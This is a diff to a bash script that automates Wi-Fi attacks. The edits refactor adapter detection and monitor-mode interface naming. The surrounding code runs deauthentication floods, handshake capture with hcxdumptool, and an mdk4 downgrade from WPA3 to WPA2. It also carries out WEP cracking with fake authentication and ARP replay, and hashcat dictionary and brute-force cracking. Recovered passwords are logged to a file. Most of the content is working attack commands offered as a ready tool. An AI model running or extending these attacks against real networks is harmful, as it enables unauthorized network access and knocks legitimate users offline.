@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version=3.6.3 # 28/5/25 15:40
+version=3.6.3 # 28/5/25 18:00
 
 
 ### Changlog ###
@@ -142,7 +142,7 @@ echo -e "\n\n"
 
 
 function first_setup() {
-    echo -e "\n${BLUE}[*] Checking and installing required packages:${RESET}"
+    echo -e "\n\n${BLUE}[*] Checking and installing required packages:${RESET}\n"
 
     mandatory_packages=("aircrack-ng" "gnome-terminal" "hashcat" "hcxtools" "gawk" "dbus-x11")
     optional_packages=("wget" "macchanger" "mdk4")
@@ -197,7 +197,7 @@ function first_setup() {
     fi
     
 
-    echo -e "\n\n${BLUE}[*] Verifying wordlists and vendor data:${RESET}"
+    echo -e "\n\n\n\n${BLUE}[*] Verifying wordlists and vendor data:${RESET}\n"
 
     if [ ! -d "$wordlists_dir" ]; then
         mkdir -p "$wordlists_dir"
@@ -239,10 +239,10 @@ function first_setup() {
 
 
 function enable_gpu() {
-    echo -e "${BLUE}[*] Getting GPU details:${RESET}"
+    echo -e "\n\n${BLUE}[*] Getting GPU details:${RESET}\n"
     # Check if running in a VM
     if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
-        echo -e "${ORANGE}    [!]${RESET} You are running inside a VM. ${BOLD}GPU is not available.${RESET}\n\n"
+        echo -e "${ORANGE}    [!]${RESET} You are running inside a VM. ${RED}GPU is not available.${RESET}\n\n"
         return 1
     fi
     # Detect GPU
@@ -296,76 +296,102 @@ function enable_gpu() {
 
 
 function adapter_config() {
-	echo -e "${BLUE}[*] Changing Wi-Fi adapter to Monitore mode:${RESET}"
-	airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes
+    echo -e "\n\n${BLUE}[*] Detecting WiFi adapters:${RESET}\n"
+    airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes
 
-	# Check known adapters first
-	if iwconfig wlan1 &> /dev/null; then
-	    wifi_adapter="wlan1"
-	elif iw dev wlan1mon info &>/dev/null; then
-	    wifi_adapter="wlan1"
-	    echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
-	    echo -e "${NEON_GREEN}    [✔]${RESET} The adapter is already in monitor mode.\n\n"
-	    return 0    
-	elif iwconfig wlan0 &> /dev/null; then
-	    wifi_adapter="wlan0"
-	elif iw dev wlan0mon info &>/dev/null; then
-	    wifi_adapter="wlan0"
-	    echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
-	    echo -e "${NEON_GREEN}    [✔]${RESET} The adapter is already in monitor mode.\n\n"
-	    return 0
-	else
-	    # Auto-detect WiFi adapter before asking the user
-	    detected_adapter=$(iw dev | awk '$1=="Interface"{print $2}')
-	    if [[ -n "$detected_adapter" ]]; then
-	        wifi_adapter="$detected_adapter"
-	    else
-	        echo -e "${RED}    [✘]${RESET} WiFi adapter not detected.\n"
-	        read -p "Please enter your WiFi adapter name: " wifi_adapter
-	        echo
-	    fi
-	fi  	
-	echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
-	echo -e "[~] Changing $wifi_adapter to monitor mode."
-	airmon-ng start "$wifi_adapter" > /dev/null 2>&1
+    # Get all WiFi interfaces
+    adapters=($(iw dev | awk '$1=="Interface"{print $2}'))
 
-	# Find the new monitor mode adapter name
-	mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}')
+    if [[ ${#adapters[@]} -eq 0 ]]; then
+        echo -e "${RED}    [✘] No WiFi adapters detected.${RESET}\n"
+        read -p "    Enter your WiFi adapter name: " manual_adapter
+        if [[ -z "$manual_adapter" ]]; then
+            echo -e "${RED}    [✘] No input provided. Exiting.${RESET}"
+            exit 1
+        fi
+        wifi_adapter="$manual_adapter"
 
-	if [[ -n "$mon_adapter" ]]; then
-		# Extract the original adapter name by removing 'mon' from the end
-		wifi_adapter="${mon_adapter%mon}"
-		echo -e "${NEON_GREEN}    [✔]${RESET} Success.\n\n"
-	else
-		echo -e "${RED}    [✘] Failed to start $wifi_adapter in monitor mode.${RESET} Check your adapter and try again.\n\n"
-		exit 1
-	fi
+    elif [[ ${#adapters[@]} -eq 1 ]]; then
+        wifi_adapter="${adapters[0]}"
+        echo -e "${NEON_GREEN}    [✔]${RESET} WiFi adapter detected: ${GREEN}$wifi_adapter${RESET}"
+    
+    else
+        # Display the adapter list with numbers starting from 1
+        for i in "${!adapters[@]}"; do
+            printf "    %d) %s\n" "$((i + 1))" "${adapters[$i]}"
+        done
+        echo
+
+        while true; do
+            read -p "    Select an adapter: " input
+
+            # If numeric and valid index
+            if [[ "$input" =~ ^[0-9]+$ ]] && (( input >= 1 && input <= ${#adapters[@]} )); then
+                wifi_adapter="${adapters[$((input - 1))]}"
+                break
+            # If matches adapter name directly
+            elif [[ " ${adapters[*]} " =~ " $input " ]]; then
+                wifi_adapter="$input"
+                break
+            else
+                echo -e "${RED}    [✘] Invalid input.${RESET} Please enter a valid number or adapter name.\n"
+            fi
+        done
+    fi
+
+    # If already in monitor mode, skip enabling it again
+    if [[ "$wifi_adapter" == *"mon" ]]; then
+        #echo -e "\n${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
+        echo -e "${NEON_GREEN}    [✔]${RESET} Adapter is already in monitor mode.\n\n"
+        return 0
+    fi
+
+    #echo -e "\n    [~] Changing $wifi_adapter to monitor mode.\n"
+    airmon-ng start "$wifi_adapter" > /dev/null 2>&1
+
+    # Look for the new monitor mode adapter
+    mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}' | grep "^${wifi_adapter}mon$")
+
+    if [[ -n "$mon_adapter" ]]; then
+        wifi_adapter=$mon_adapter
+        #echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
+        echo -e "${NEON_GREEN}    [✔]${RESET} Successfully switched to monitor mode.\n\n"
+    else
+        echo -e "${RED}    [✘] Failed to start $wifi_adapter in monitor mode.${RESET} Check your adapter and try again.\n\n"
+        exit 1
+    fi
 }
 
 
 
+
+
+
+
+
+
 function spoof_adapter_mac() {
-    echo -e "${BLUE}[*] Randomizing Wi-Fi adapter MAC address:${RESET}"
+    echo -e "\n\n${BLUE}[*] Randomizing WiFi adapter MAC address:${RESET}\n"
 
     # Bring interface down
-    ifconfig ${wifi_adapter}mon down
+    ifconfig ${wifi_adapter} down
 
     # Get permanent MAC + vendor
-    perm_output=$(macchanger -p ${wifi_adapter}mon 2>/dev/null)
+    perm_output=$(macchanger -p ${wifi_adapter} 2>/dev/null)
     perm_mac=$(echo "$perm_output" | awk -F': ' '/Permanent MAC:/ {print $2}' | cut -d' ' -f1 | tr '[:lower:]' '[:upper:]')
     perm_vendor=$(echo "$perm_output" | sed -n 's/.*Permanent MAC:.*(\(.*\)).*/\1/p')
 
     # Randomize MAC
-    rand_output=$(macchanger -r ${wifi_adapter}mon 2>/dev/null)
+    rand_output=$(macchanger -r ${wifi_adapter} 2>/dev/null)
     rand_mac=$(echo "$rand_output" | awk -F': ' '/New MAC:/ {print $2}' | cut -d' ' -f1 | tr '[:lower:]' '[:upper:]')
     rand_vendor=$(echo "$rand_output" | sed -n 's/.*New MAC:.*(\(.*\)).*/\1/p')
 
     # Bring interface up
-    ifconfig ${wifi_adapter}mon up
+    ifconfig ${wifi_adapter} up
 
     # Fallback if parsing failed
     if [ -z "$rand_mac" ]; then
-        rand_mac=$(ip link show ${wifi_adapter}mon | awk '/link\/ieee802.11/ {print $2}' | tr '[:lower:]' '[:upper:]')
+        rand_mac=$(ip link show ${wifi_adapter} | awk '/link\/ieee802.11/ {print $2}' | tr '[:lower:]' '[:upper:]')
         rand_vendor="unknown"
     fi
 
@@ -384,8 +410,8 @@ function spoof_adapter_mac() {
 
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=4
-        gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
+        countdown_duration=15
+        gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter} --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n${BLUE}Scanning available WiFi Networks ($countdown_duration s):${RESET}"
         for (( i=$countdown_duration; i>=1; i-- )); do
@@ -578,11 +604,11 @@ function choose_network() {
             continue                    
         fi
 
-        # Check if we already have the Wi-Fi password for this BSSID
-        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The Wi-Fi password is:"; then
-            wifi_password=$(grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The Wi-Fi password is:" | awk -F': ' '{print $2}' | xargs)
+        # Check if we already have the WiFi password for this BSSID
+        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The WiFi password is:"; then
+            wifi_password=$(grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The WiFi password is:" | awk -F': ' '{print $2}' | xargs)
             echo -e "${GREEN}Password already exists for this network!${RESET}"
-            echo -e "${BLUE}The Wi-Fi password is:${RESET} ${ORANGE}$wifi_password${RESET}\n"
+            echo -e "${BLUE}The WiFi password is:${RESET} ${ORANGE}$wifi_password${RESET}\n"
             echo -e "Choose different Network.\n"
             continue 
         fi
@@ -623,7 +649,7 @@ function validate_network() {
     echo -e "${BOLD}Validating network:${RESET}"
     
     # Open airodump-ng in a hidden terminal
-    gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
+    gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter" "$targets_path/$bssid_name/airodump_output.txt"
 
     found=0
     echo -n "Checking"
@@ -701,7 +727,7 @@ function devices_scanner() {
 
 
 function deauth_attack() {
-    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
+    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"
 }
 
 
@@ -735,10 +761,10 @@ function capture_handshake() {
     # Start hcxdumptool in hidden terminal
     if [[ -n "$band" ]]; then
         channel_with_band="${channel}${band}"
-        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}mon' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
     else
         echo "Warning: Unknown channel ($channel), running without -c"
-        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}mon' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
+        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
     fi
 
     sleep 2
@@ -789,7 +815,7 @@ function capture_handshake() {
 
 function mixed_encryption() {
     echo -e "${BOLD}The Encryption is "$encryption".${RESET} \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
-    gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
+    gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter b -n $bssid_name_original -c $channel -w a
     sleep 5
 }
 
@@ -812,7 +838,7 @@ function crack_wep() {
     # Start airodump-ng in a new terminal and get the terminal's PID
     # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
     # Remove 'exec bash' if you want the terminal to close automatically.
-    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}mon; exec bash" &
+    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}; exec bash" &
     airodump_terminal_pid=$!
 
     #echo -e "[*] Waiting 6 seconds for airodump-ng to initialize and create capture files..."
@@ -826,17 +852,17 @@ function crack_wep() {
     fi
     
     echo -e "[*] Attempting deauthentication attack to generate IVs..."
-    gnome-terminal --geometry=78x4-10000-10000 -- timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}mon"
+    gnome-terminal --geometry=78x4-10000-10000 -- timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}"
     # No need to wait for deauth terminal, it's short-lived
 
     echo -e "[*] Attempting fake authentication with AP ($bssid_address)..."
-    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'Fake auth attempt finished. Press Enter to close.'; read"
+    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}; echo 'Fake auth attempt finished. Press Enter to close.'; read"
     #echo -e "[*] Pausing for 3 seconds after fake authentication attempt..."
     sleep 3 # Give time for fake auth to potentially associate
 
     echo -e "[*] Attempting ARP Replay attack to generate IVs faster..."
     # Start ARP Replay in a new terminal and get its PID
-    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
+    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
     arp_replay_terminal_pid=$!
     sleep 2 # Give ARP replay a moment to start
 
@@ -899,10 +925,10 @@ function crack_wep() {
             echo -e "${ORANGE}WEP Key (ASCII):${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
         fi
         
-        echo -e "\n\n${BLUE}The Wi-Fi password for${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
+        echo -e "\n\n${BLUE}The WiFi password for${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET} ${NEON_GREEN}$wifi_pass${RESET}"
         echo -e "Important: If this is a HEX key, you might not need to enter the colons (:)."
         echo -e "---" >> "$targets_path/wifi_passwords.txt"
-        printf "The Wi-Fi password for %s (%s) is: %s\n" "$bssid_name_original" "$bssid_address" "$wifi_pass" >> "$targets_path/wifi_passwords.txt"
+        printf "The WiFi password for %s (%s) is: %s\n" "$bssid_name_original" "$bssid_address" "$wifi_pass" >> "$targets_path/wifi_passwords.txt"
     else
         echo -e "${RED}Failed to crack WEP password after attempts.${RESET}"
         echo -e "Consider running the capture for a longer time to collect more IVs."
@@ -946,7 +972,7 @@ while true; do
     esac
 done
 
-echo -e "\n${BOLD}Cracking Wi-Fi password using:${RESET} $dict_file ${BOLD}->>${RESET}\n"
+echo -e "\n${BOLD}Cracking WiFi password using:${RESET} $dict_file ${BOLD}->>${RESET}\n"
 
     gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c \
     "hashcat -m 22000 -a 0 \"$targets_path/$bssid_name/hash.hc22000\" \"$dict_file\" \
@@ -956,7 +982,7 @@ echo -e "\n${BOLD}Cracking Wi-Fi password using:${RESET} $dict_file ${BOLD}->>${
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-        echo -e "${BLUE}The Wi-Fi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}\t${ORANGE}$wifi_pass${RESET}"
+        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}\t${ORANGE}$wifi_pass${RESET}"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
         
         #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
@@ -966,7 +992,7 @@ echo -e "\n${BOLD}Cracking Wi-Fi password using:${RESET} $dict_file ${BOLD}->>${
 
         
         
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r "$targets_path/$bssid_name"
         exit 1
     else
@@ -999,7 +1025,7 @@ function brute-force_attack() {
 
     # Ask user for password length
     while true; do
-        read -p "Enter password length (Wi-Fi min: 8): " password_length
+        read -p "Enter password length (WiFi min: 8): " password_length
         if [[ -z "$password_length" ]]; then
             password_length=8
             echo "default is 8"
@@ -1131,15 +1157,12 @@ function brute-force_attack() {
     echo
     if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
         wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
-        echo -e "${BLUE}The wifi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
+        echo -e "${BLUE}The WiFi password of${RESET} ${RED}$bssid_name_original${RESET} ${BLUE}is:${RESET}	${ORANGE}$wifi_pass${RESET}"
         bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
-        
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
 
-        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
-        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"
         
-        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
+        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The WiFi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
         rm -r $targets_path/"$bssid_name" 
         exit 1
     else
@@ -1205,7 +1228,7 @@ function another_scan_prompt() {
 
 function cleanup() {
 	chown -R $UN:$UN $targets_path
-	gnome-terminal --geometry=1x1-10000-10000 -- airmon-ng stop "$wifi_adapter"mon
+	gnome-terminal --geometry=1x1-10000-10000 -- airmon-ng stop "$wifi_adapter"
 	gnome-terminal --geometry=1x1-10000-10000 -- systemctl start NetworkManager
 }
 
